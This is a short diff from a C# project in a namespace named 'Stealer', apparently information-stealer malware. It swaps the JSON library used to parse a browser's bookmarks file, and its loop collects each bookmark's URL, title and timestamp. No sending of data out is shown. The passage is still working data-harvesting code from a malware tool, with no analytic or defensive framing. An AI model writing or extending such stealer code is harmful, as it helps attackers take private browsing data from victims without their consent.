@@ -53,13 +53,13 @@ namespace Stealer
 
 
                 string bookmarksFile = File.ReadAllText(browser);
-                foreach (var mark in Newtonsoft.Json.Linq.JObject.Parse(bookmarksFile)["roots"]["bookmark_bar"]["children"])
+                foreach (SimpleJSON.JSONNode mark in SimpleJSON.JSON.Parse(bookmarksFile)["roots"]["bookmark_bar"]["children"])
                 {
                     string[] bookmark = new string[3]
                     {
-                        (string)mark["url"],
-                        (string)mark["name"],
-                        Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * Convert.ToInt64(mark["date_added"])), TimeZoneInfo.Local))
+                        mark["url"],
+                        mark["name"],
+                        Convert.ToString(TimeZoneInfo.ConvertTimeFromUtc(DateTime.FromFileTimeUtc(10 * Convert.ToInt64((string)mark["date_added"])), TimeZoneInfo.Local))
                     };
                     bookmarks.Add(bookmark);
                 }
